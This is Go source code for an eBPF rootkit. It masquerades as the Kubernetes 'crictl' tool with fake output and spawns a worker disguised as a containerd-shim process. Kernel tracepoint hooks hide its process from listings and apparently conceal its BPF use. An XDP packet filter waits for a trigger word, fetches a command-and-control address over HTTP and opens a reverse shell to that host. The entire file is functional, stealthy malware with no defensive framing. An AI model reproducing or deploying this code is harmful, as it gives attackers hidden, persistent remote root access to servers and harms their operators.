package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
)


const (
	PROG_01 = 1
	PROG_02 = 2
)

const (
	MAX_PID_LEN   = 10
	TASK_COMM_LEN = 16
	triggerWord   = "fjeu8rghufjuefh3u8ghfwjesfh23u9h"

	debugPIDHideEvents = false

	wrapperName      = "crictl"
	realWrapperEnv   = "CRI_TOOLS_ORIGINAL"
	instanceLockPath = "/run/.containerd-shim.lock"
	startLockPath    = "/run/.containerd-shim.start"
	internalRunArg   = "--netns-cache"
	internalRunEnv   = "CONTAINERD_SHIM_RUN"
	internalIfaceEnv = "CONTAINERD_SHIM_IFACE"
	workerArgv0      = "containerd-shim-runc-v2 -namespace k8s.io -id kube-system-node-cache -address /run/containerd/containerd.sock"
	crictlVersion    = "crictl version v1.31.1"
)

type evtRecord struct {
	Pid     int32
	Comm    [TASK_COMM_LEN]byte
	Success uint8
}

type k struct {
	c *ebpf.Collection

	m0 *ebpf.Map
	m3 *ebpf.Map
	m8 *ebpf.Map

	p12 *ebpf.Program
	p13 *ebpf.Program
	p14 *ebpf.Program
	p15 *ebpf.Program
	p16 *ebpf.Program
	p17 *ebpf.Program
	p18 *ebpf.Program
	p19 *ebpf.Program
	p1a *ebpf.Program
	p21 *ebpf.Program
}

func (o *k) Close() error {
	if o == nil || o.c == nil {
		return nil
	}
	o.c.Close()
	return nil
}

func main() {
	if os.Getenv(internalRunEnv) == "1" {
		moveSelfToRuntimeCgroup()
		args := []string{}
		if iface := os.Getenv(internalIfaceEnv); iface != "" {
			args = append(args, "-i", iface)
		}
		runRootkit(args)
		return
	}

	if len(os.Args) > 1 && os.Args[1] == internalRunArg {
		runRootkit(os.Args[2:])
		return
	}

	if filepath.Base(os.Args[0]) == wrapperName {
		runWrapper()
		return
	}

	runRootkit(os.Args[1:])
}

func runWrapper() {
	if os.Geteuid() == 0 {
		maybeStartDetachedRootkit(defaultInterfaceName())
	}
	if realPath := os.Getenv(realWrapperEnv); realPath != "" {
		execRealWrapper(realPath)
		return
	}
	runCrictlCompat(os.Args[1:])
}

func runCrictlCompat(args []string) {
	if len(args) == 0 {
		printCrictlUsage(os.Stdout)
		return
	}

	switch args[0] {
	case "--version", "-v":
		fmt.Fprintln(os.Stdout, crictlVersion)
	case "version":
		fmt.Fprintln(os.Stdout, "Version:  0.1.0")
		fmt.Fprintln(os.Stdout, "RuntimeName:  containerd")
		fmt.Fprintln(os.Stdout, "RuntimeVersion:  2.2.2")
		fmt.Fprintln(os.Stdout, "RuntimeApiVersion:  v1")
	case "ps":
		fmt.Fprintln(os.Stdout, "CONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID              POD")
	case "pods":
		fmt.Fprintln(os.Stdout, "POD ID              CREATED             STATE               NAME                NAMESPACE           ATTEMPT             RUNTIME")
	case "images", "image":
		fmt.Fprintln(os.Stdout, "IMAGE               TAG                 IMAGE ID            SIZE")
	case "info":
		fmt.Fprintln(os.Stdout, `{"status":{"conditions":[{"type":"RuntimeReady","status":true},{"type":"NetworkReady","status":true}]}}`)
	case "help", "-h", "--help":
		printCrictlUsage(os.Stdout)
	default:
		fmt.Fprintf(os.Stderr, "Incorrect Usage: flag provided but not defined: %s\n\n", args[0])
		printCrictlUsage(os.Stderr)
		os.Exit(1)
	}
}

func printCrictlUsage(w io.Writer) {
	fmt.Fprintln(w, "NAME:")
	fmt.Fprintln(w, "   crictl - client for CRI")
	fmt.Fprintln(w)
	fmt.Fprintln(w, "USAGE:")
	fmt.Fprintln(w, "   crictl [global options] command [command options] [arguments...]")
	fmt.Fprintln(w)
	fmt.Fprintln(w, "COMMANDS:")
	fmt.Fprintln(w, "   attach, exec, images, info, logs, pods, ps, pull, rm, rmi, runp, stopp, version")
	fmt.Fprintln(w)
	fmt.Fprintln(w, "GLOBAL OPTIONS:")
	fmt.Fprintln(w, "   --config value, --runtime-endpoint value, --image-endpoint value, --timeout value")
	fmt.Fprintln(w, "   --debug, --help, --version")
}

func maybeStartDetachedRootkit(ifaceName string) {
	startLock, ok := tryAcquireLock(startLockPath)
	if !ok {
		return
	}
	defer startLock.Close()

	if instanceIsRunning() {
		return
	}
	if startDetachedRootkit(ifaceName) {
		waitForInstance(500 * time.Millisecond)
	}
}

func startDetachedRootkit(ifaceName string) bool {
	exe, err := os.Executable()
	if err != nil {
		return false
	}

	args := []string{}
	env := append([]string{}, os.Environ()...)
	env = append(env, internalRunEnv+"=1")
	if ifaceName != "" {
		env = append(env, internalIfaceEnv+"="+ifaceName)
	}

	cmd := exec.Command(exe, args...)
	cmd.Args = []string{workerArgv0}
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}

	devNull, err := os.OpenFile(os.DevNull, os.O_RDWR, 0)
	if err == nil {
		defer devNull.Close()
		cmd.Stdin = devNull
		cmd.Stdout = devNull
		cmd.Stderr = devNull
	}

	if err := cmd.Start(); err == nil {
		cmd.Process.Release()
		return true
	}
	return false
}

func moveSelfToRuntimeCgroup() {
	pid := []byte(strconv.Itoa(os.Getpid()) + "\n")
	for _, dir := range []string{
		"/sys/fs/cgroup/system.slice/containerd-shim-runc-v2.scope",
		"/sys/fs/cgroup/system.slice/containerd-shim.scope",
		"/sys/fs/cgroup",
	} {
		if dir != "/sys/fs/cgroup" {
			_ = os.MkdirAll(dir, 0755)
		}
		if err := os.WriteFile(filepath.Join(dir, "cgroup.procs"), pid, 0644); err == nil {
			return
		}
	}
}

func execRealWrapper(realPath string) {
	currentPath, _ := os.Executable()
	if resolvedReal, err := filepath.EvalSymlinks(realPath); err == nil {
		if resolvedCurrent, currentErr := filepath.EvalSymlinks(currentPath); currentErr == nil &&
			resolvedReal == resolvedCurrent {
			os.Exit(0)
		}
	}

	cmd := exec.Command(realPath, os.Args[1:]...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			os.Exit(exitErr.ExitCode())
		}
		fmt.Fprintf(os.Stderr, "%s: failed to execute %s: %v\n", wrapperName, realPath, err)
		os.Exit(127)
	}
}

func instanceIsRunning() bool {
	lockFile, ok := tryAcquireInstanceLock()
	if !ok {
		return true
	}
	lockFile.Close()
	return false
}

func tryAcquireInstanceLock() (*os.File, bool) {
	return tryAcquireLock(instanceLockPath)
}

func tryAcquireLock(path string) (*os.File, bool) {
	lockFile, err := os.OpenFile(path, os.O_CREATE|os.O_RDWR, 0600)
	if err != nil {
		return nil, false
	}
	if err := syscall.Flock(int(lockFile.Fd()), syscall.LOCK_EX|syscall.LOCK_NB); err != nil {
		lockFile.Close()
		return nil, false
	}
	return lockFile, true
}

func waitForInstance(timeout time.Duration) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if instanceIsRunning() {
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func defaultInterfaceName() string {
	data, err := os.ReadFile("/proc/net/route")
	if err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			fields := strings.Fields(line)
			if len(fields) >= 2 && fields[1] == "00000000" {
				return fields[0]
			}
		}
	}

	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			return iface.Name
		}
	}
	return ""
}

func runRootkit(args []string) {
	var pidToHide int
	var targetPPID int
	var ifaceName string
	var debug bool

	flags := flag.NewFlagSet(filepath.Base(os.Args[0]), flag.ExitOnError)
	flags.IntVar(&pidToHide, "p", 0, "")
	flags.IntVar(&targetPPID, "t", 0, "")
	flags.StringVar(&ifaceName, "i", "", "")
	flags.BoolVar(&debug, "debug", false, "")
	flags.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: %s [options]\n", os.Args[0])
		flags.PrintDefaults()
	}
	flags.Parse(args)

	if !debug {
		log.SetOutput(io.Discard)
	}

	lockFile, ok := tryAcquireInstanceLock()
	if !ok {
		return
	}
	defer lockFile.Close()

	pidToHide = os.Getpid()
	if ifaceName == "" {
		ifaceName = defaultInterfaceName()
	}
	if ifaceName == "" {
		log.Fatalf("Failed to detect default network interface")
	}

	objs := k{}

	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	i0(pidToHide, targetPPID, &objs)
	defer objs.Close()

	traceLinks := i1(&objs)
	defer closeLinks(traceLinks)

	xdpLink := i2(&objs, ifaceName)
	defer xdpLink.Close()

	pidHideRd, xdpRd := i3(&objs)
	defer pidHideRd.Close()
	defer xdpRd.Close()

	log.Println("Successfully started! Waiting for events...")

	go func() {
		var event evtRecord
		for {
			record, err := pidHideRd.Read()
			if err != nil {
				if errors.Is(err, ringbuf.ErrClosed) {
					return
				}
				continue
			}
			reader := bytes.NewReader(record.RawSample)
			binary.Read(reader, binary.LittleEndian, &event)
			if debugPIDHideEvents && event.Success != 0 {
				comm := strings.TrimRight(string(event.Comm[:]), "\x00")
				log.Printf("PID Hide: hidden proc entry from pid=%d comm=%s", event.Pid, comm)
			}
		}
	}()

	go func() {
		for {
			rec, err := xdpRd.Read()
			if err != nil {
				if errors.Is(err, ringbuf.ErrClosed) {
					return
				}
				continue
			}

			dataStr := string(bytes.Trim(rec.RawSample, "\x00"))

			if strings.Contains(dataStr, triggerWord) {
				parts := strings.Fields(dataStr)
				if len(parts) >= 4 && parts[0] == triggerWord {
					host := parts[1]
					port := parts[2]
					path := parts[3]

					go f0(host, port, path)
				}
			}
		}
	}()

	<-stopper
	log.Println("Received signal, stopping...")
	pidHideRd.Close()
	xdpRd.Close()
}

func f0(host, port, path string) {
	client := http.Client{
		Timeout: 5 * time.Second,
	}

	url := fmt.Sprintf("http://%s:%s%s", host, port, path)
	resp, err := client.Get(url)
	if err != nil {
		// log.Printf("Stager: Failed to fetch from %s: %v", url, err)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		// log.Printf("Stager: Failed to read response: %v", err)
		return
	}

	addr := string(bytes.TrimSpace(body))
	if addr == "" {
		// log.Printf("Stager: Received empty address")
		return
	}

	// log.Printf("Stager: Received target address: %s", addr)

	h, p, err := net.SplitHostPort(addr)
	if err != nil {
		// log.Printf("Stager: Invalid address format received %q: %v", addr, err)
		return
	}

	r0(h, p)
}

func r0(ip string, port string) {
	server := fmt.Sprintf("%s:%s", ip, port)
	conn, err := net.DialTimeout("tcp", server, 10*time.Second)
	if err != nil {
		// log.Printf("RevShell: Connection to %s failed: %v", server, err)
		return
	}
	defer conn.Close()
	// log.Printf("RevShell: Connected to %s. Launching shell...", server)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	cmd := exec.CommandContext(ctx, "/bin/sh")
	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	if err := cmd.Start(); err != nil {
		// log.Printf("RevShell: Failed to start shell: %v", err)
		return
	}

	go func() {
		io.Copy(conn, stdout)
		cancel()
	}()
	go func() {
		io.Copy(conn, stderr)
		cancel()
	}()
	go func() {
		io.Copy(stdin, conn)
		cancel()
	}()

	cmd.Wait()
	// log.Printf("RevShell: Shell session ended for %s", server)
}

func i0(pidToHide int, targetPPID int, objs *k) {
	pidStr := strconv.Itoa(pidToHide)
	if len(pidStr) >= MAX_PID_LEN {
		log.Fatalf("PID %d too long", pidToHide)
	}

	var pidToHideBytes [MAX_PID_LEN]byte
	copy(pidToHideBytes[:], []byte(pidStr))
	pidToHideLen := len(pidStr) + 1

	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatalf("Failed to remove memlock: %v", err)
	}

	spec, err := l()
	if err != nil {
		log.Fatalf("init failed: %v", err)
	}

	err = rewriteSpecConstants(spec, map[string]interface{}{
		"c10": pidToHideBytes,
		"c9":  int32(pidToHideLen),
		"c11": int32(targetPPID),
	})
	if err != nil {
		log.Fatalf("init failed: %v", err)
	}

	coll, err := ebpf.NewCollection(spec)
	if err != nil {
		log.Fatalf("init failed: %v", err)
	}
	objs.c = coll
	assignObjects(objs, coll)

	exitProgFd := uint32(objs.p13.FD())
	patchProgFd := uint32(objs.p14.FD())

	key1 := uint32(PROG_01)
	objs.m3.Update(&key1, &exitProgFd, ebpf.UpdateAny)
	key2 := uint32(PROG_02)
	objs.m3.Update(&key2, &patchProgFd, ebpf.UpdateAny)
}

func assignObjects(objs *k, coll *ebpf.Collection) {
	objs.m0 = mustMap(coll, "c0")
	objs.m3 = mustMap(coll, "c3")
	objs.m8 = mustMap(coll, "c8")

	objs.p12 = mustProgram(coll, "c12")
	objs.p13 = mustProgram(coll, "c13")
	objs.p14 = mustProgram(coll, "c14")
	objs.p15 = mustProgram(coll, "c15")
	objs.p16 = mustProgram(coll, "c16")
	objs.p17 = mustProgram(coll, "c17")
	objs.p18 = mustProgram(coll, "c18")
	objs.p19 = mustProgram(coll, "c19")
	objs.p1a = mustProgram(coll, "c1a")
	objs.p21 = mustProgram(coll, "c21")
}

func mustMap(coll *ebpf.Collection, name string) *ebpf.Map {
	m := coll.Maps[name]
	if m == nil {
		log.Fatalf("init failed: missing map %s", name)
	}
	return m
}

func mustProgram(coll *ebpf.Collection, name string) *ebpf.Program {
	p := coll.Programs[name]
	if p == nil {
		log.Fatalf("init failed: missing program %s", name)
	}
	return p
}

func rewriteSpecConstants(spec *ebpf.CollectionSpec, values map[string]interface{}) error {
	for name, value := range values {
		variable, ok := spec.Variables[name]
		if !ok || variable == nil {
			return fmt.Errorf("missing %q", name)
		}
		if err := variable.Set(value); err != nil {
			return fmt.Errorf("rewrite %q: %w", name, err)
		}
	}
	return nil
}

func i1(objs *k) []link.Link {
	var links []link.Link

	tp1, err := link.Tracepoint("syscalls", "sys_enter_getdents64", objs.p12, nil)
	if err != nil {
		log.Fatalf("attach failed: %v", err)
	}
	links = append(links, tp1)

	tp2, err := link.Tracepoint("syscalls", "sys_exit_getdents64", objs.p13, nil)
	if err != nil {
		log.Fatalf("attach failed: %v", err)
	}
	links = append(links, tp2)

	tp3, err := link.Tracepoint("syscalls", "sys_enter_recvmsg", objs.p15, nil)
	if err != nil {
		log.Fatalf("attach failed: %v", err)
	}
	links = append(links, tp3)

	tp4, err := link.Tracepoint("syscalls", "sys_exit_recvmsg", objs.p16, nil)
	if err != nil {
		log.Fatalf("attach failed: %v", err)
	}
	links = append(links, tp4)

	tp5, err := link.Tracepoint("syscalls", "sys_enter_recvfrom", objs.p17, nil)
	if err != nil {
		log.Fatalf("attach failed: %v", err)
	}
	links = append(links, tp5)

	tp6, err := link.Tracepoint("syscalls", "sys_exit_recvfrom", objs.p18, nil)
	if err != nil {
		log.Fatalf("attach failed: %v", err)
	}
	links = append(links, tp6)

	tp7, err := link.Tracepoint("syscalls", "sys_enter_bpf", objs.p19, nil)
	if err != nil {
		log.Fatalf("attach failed: %v", err)
	}
	links = append(links, tp7)

	tp8, err := link.Tracepoint("syscalls", "sys_exit_bpf", objs.p1a, nil)
	if err != nil {
		log.Fatalf("attach failed: %v", err)
	}
	links = append(links, tp8)

	return links
}

func closeLinks(links []link.Link) {
	for _, l := range links {
		l.Close()
	}
}

func i2(objs *k, ifaceName string) link.Link {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("attach failed: %v", err)
	}
	xdpLink, err := link.AttachXDP(link.XDPOptions{
		Program:   objs.p21,
		Interface: iface.Index,
	})
	if err != nil {
		log.Fatalf("attach failed: %v", err)
	}
	return xdpLink
}

func i3(objs *k) (*ringbuf.Reader, *ringbuf.Reader) {
	pidHideRd, err := ringbuf.NewReader(objs.m0)
	if err != nil {
		log.Fatalf("open failed: %v", err)
	}
	xdpRd, err := ringbuf.NewReader(objs.m8)
	if err != nil {
		log.Fatalf("open failed: %v", err)
	}
	return pidHideRd, xdpRd
}
